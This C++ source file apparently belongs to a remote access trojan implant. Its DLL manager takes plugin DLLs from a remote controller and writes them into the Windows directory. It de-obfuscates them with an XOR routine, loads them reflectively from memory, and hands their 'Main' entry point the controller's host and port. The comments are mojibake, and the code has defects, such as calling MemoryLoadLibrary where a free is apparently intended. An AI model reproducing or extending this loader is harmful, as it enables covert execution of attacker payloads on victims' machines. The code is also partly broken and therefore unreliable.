// DllManager.cpp: implementation of the CDllManager class.
//
//////////////////////////////////////////////////////////////////////

#include "DllManager.h"
#include "KernelManager.h"
#include "MemLoadDll.h"
typedef struct 
{
	DWORD	dwSizeHigh1;
	DWORD	dwSizeLow1;
}FILESIZEDLL;

HMEMORYMODULE hdllmod;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CDllManager::CDllManager(CClientSocket *pClient, LPBYTE lparam/*, DWORD dwdatasize*/):CManager(pClient)
{
	char * lpDllName;
	int nDllLength = strlen((char*)(lparam +4)) +1;
	if(nDllLength == 0)
		return ;
	lpDllName = (char *)malloc(nDllLength);
	memcpy(lpDllName,lparam +4, nDllLength );

	strcpy(m_strCurrentProcessFileName,lpDllName);
	DWORD dwdatasize;
	memcpy(&dwdatasize,lparam,4);
	LPBYTE token;
	token=(LPBYTE)LocalAlloc(LPTR, dwdatasize + 5 + nDllLength);
	datasize = dwdatasize;
	token[0] = TOKEN_DLLMAIN;
	memcpy(token + 1 , lparam  , dwdatasize+ nDllLength + 5);
	Send(token, dwdatasize + 5 + nDllLength);
// 	puts("�Ի�ÿ�ʼ����DLL��Ϣ");
//	MessageBox(NULL, "1", "", NULL);
}

CDllManager::~CDllManager()
{
}


void CDllManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{

	case COMMAND_DLLOK:
		{
// 			puts("�������DLL");
			LoadLib(lpBuffer+1);
// 			puts("����DLL���");
		}
		break;
	case COMMAND_DLLVERSION:
		{
			Sleep(80);
// 			puts("���Ͱ汾");
			SendDllVersion(m_strCurrentProcessFileName);;
		}
		break;
	case COMMAND_FILE_DATA:
		WriteLocalRecvFile(lpBuffer + 1, nSize -1);
		break;
	case COMMAND_FILE_SIZE:
		CreateLocalRecvFile(lpBuffer + 1);
		break;
	default:
		break;
	}
}
void EncryptDataA(unsigned char *szRec, unsigned long nLen, unsigned long key)//����
{
	unsigned long i;
	unsigned char p;
	
	p = (unsigned char ) key % 1451 + 61;
	
	for(i = 0; i < nLen; i++) 
	{
		*szRec ^= p;
		*szRec += p;
		szRec++;
	}
}

int CDllManager::SendToken(BYTE bToken)
{
	return Send(&bToken, 1);
}

LPBYTE CDllManager::getDllVersion(LPCTSTR lpDllName)
{
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;

	char		strSysPath[MAX_PATH];
	GetWindowsDirectory(strSysPath, MAX_PATH);
	strcat(strSysPath, "\\");
	strcat(strSysPath, lpDllName);

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);

	if(GetFileAttributes(strSysPath) != -1)
	{
		hDllFile =CreateFile(strSysPath,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	   if (hDllFile==INVALID_HANDLE_VALUE)
	   {
	// 	   OutputDebugStringA("���ļ�ʧ��");
	   }
		
		SizeDll  = GetFileSize(hDllFile,0);
		if (!SizeDll==0)
		{
// 			OutputDebugStringA("��ô�С�ɹ�");
		}

		MemDll =malloc(SizeDll);
		if (!MemDll==0)
		{
// 		 			OutputDebugStringA("�����ڴ�ɹ�");
		}
		if (ReadFile(hDllFile,MemDll,SizeDll,&BytesRead,0)==TRUE)
		{
// 			OutputDebugStringA("�������ݳɹ�");
		}
		CloseHandle(hDllFile);
		EncryptDataA((unsigned char *)MemDll,SizeDll,1024);
		typedef char * (* DLLVERSION)();
		hdllmod = ::MemoryLoadLibrary(MemDll);
		if(hdllmod != NULL)
		{
 			char strdllversion[256]={0};
			DLLVERSION lpproc;
			lpproc = (DLLVERSION)MemoryGetProcAddress (hdllmod,"Version");
			if(lpproc!=NULL)
			strcpy(strdllversion ,(char *)(*lpproc)());
			MemoryFreeLibrary(hdllmod);	
			////���ͷ���汾
			lpBuffer[0] = TOKEN_DLLVERSION;
			dwOffset = 1;

			memcpy(lpBuffer + dwOffset, strdllversion, lstrlen(strdllversion) + 1);
			dwOffset += lstrlen(strdllversion) + 1;

			memcpy(lpBuffer + dwOffset, lpDllName, lstrlen(lpDllName) + 1);
			dwOffset += lstrlen(lpDllName) + 1;

			lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
			return lpBuffer;
		}
	}
	//����ʧ�ܣ�Ҫ���ش�
	lpBuffer[0] = TOKEN_DLLLOADERROR;
	dwOffset=1;
	memcpy(lpBuffer + dwOffset, lpDllName, lstrlen(lpDllName) + 1);
	dwOffset += lstrlen(lpDllName) + 1;
			
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);

	return lpBuffer;
}

void CDllManager::SendDllVersion(LPCTSTR lpDllName)
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getDllVersion(lpDllName);
	if (lpBuffer == NULL)
		return;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CDllManager::LoadLib(LPBYTE xlparam)
{
	char * lpDllName;
	int nDllLength = strlen((char*)(xlparam +4)) +1 ;
	if(nDllLength == 0)
		return ;
	lpDllName = (char *)malloc(nDllLength);
	memcpy(lpDllName,xlparam +4 , nDllLength );

	char		strSysPath[MAX_PATH];
	GetWindowsDirectory(strSysPath, MAX_PATH);
	strcat(strSysPath, "\\");
	strcat(strSysPath, lpDllName);

	if(GetFileAttributes(strSysPath) != -1)
	{
		hDllFile =CreateFile(strSysPath,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);//�����һ���������������Ǹ�GetModuleFileName
		SizeDll  =GetFileSize(hDllFile,0);
		MemDll   =VirtualAlloc(0,SizeDll,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
		ReadFile(hDllFile,MemDll,SizeDll,&BytesRead,0);
		CloseHandle(hDllFile);
		EncryptDataA((unsigned char *)MemDll,SizeDll,1024);
		typedef void (* DLLMain)(LPCTSTR strHost, UINT HostPort, LPBYTE xlparam);
		hdllmod = ::MemoryLoadLibrary (MemDll);
		if(hdllmod != NULL)
		{
			DLLMain lpproc;
			lpproc = (DLLMain)MemoryGetProcAddress (hdllmod,"Main");
// 			puts("׼������");
			if(lpproc!=NULL)
			{
// 				puts("���سɹ�");
				SendToken(TOKEN_DLLOK);
				(*lpproc)(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort, xlparam);
			}
			if(hdllmod!=NULL)
				MemoryLoadLibrary(hdllmod);
			return;
		}
	}
// 	puts("Error");
 	SendToken(TOKEN_DLLLOADERROR);

}

void CDllManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	// �������
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
	int		nHeadLength = 9; // 1 + 4 + 4  ���ݰ�ͷ����С��Ϊ�̶���9

	FILESIZEDLL	*pFileSize;
	// �õ����ݵ�ƫ��
	pData = lpBuffer + 8;
	
	pFileSize = (FILESIZEDLL *)lpBuffer;
	
	// �õ��������ļ��е�ƫ��
	
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh1;
	LONG	dwOffsetLow = pFileSize->dwSizeLow1;
	
	
	dwBytesToWrite = nSize - 8;
	char		strSysPath[MAX_PATH];
	GetWindowsDirectory(strSysPath, MAX_PATH);
	strcat(strSysPath, "\\");
	strcat(strSysPath, m_strCurrentProcessFileName);
	HANDLE	hFile = 
		CreateFile
		(
		strSysPath,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	int nRet = 0;
	// д���ļ�
	nRet = WriteFile
		(
		hFile,
		pData, 
		dwBytesToWrite, 
		&dwBytesWrite,
		NULL
		);
	// 	if (nRet <= 0)
	// 		printf("�ļ�д��ʧ��");
	CloseHandle(hFile);
	// Ϊ�˱Ƚϣ�����������
	
	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;
	dwOffsetLow += dwBytesWrite;
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	Send(bToken, sizeof(bToken));
}

void CDllManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	FILESIZEDLL	*pFileSize = (FILESIZEDLL *)lpBuffer;
	// �����ļ�����
	m_nCurrentProcessFileLength = (pFileSize->dwSizeHigh1 * (MAXDWORD + 1)) + pFileSize->dwSizeLow1;

	GetFileData();
}

void CDllManager::GetFileData()
{
	int	nTransferMode = TRANSFER_MODE_OVERWRITE;
	
	//  1�ֽ�Token,���ֽ�ƫ�Ƹ���λ�����ֽ�ƫ�Ƶ���λ
	BYTE	bToken[9];
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;
	char		strSysPath[MAX_PATH];
	GetWindowsDirectory(strSysPath, MAX_PATH);
	strcat(strSysPath, "\\");
	strcat(strSysPath, m_strCurrentProcessFileName);
	HANDLE	hFile = 
		CreateFile
		(
		strSysPath,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	// ��Ҫ������
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nCurrentProcessFileLength = 0;
		return;
	}
	CloseHandle(hFile);

	Send(bToken, sizeof(bToken));
}
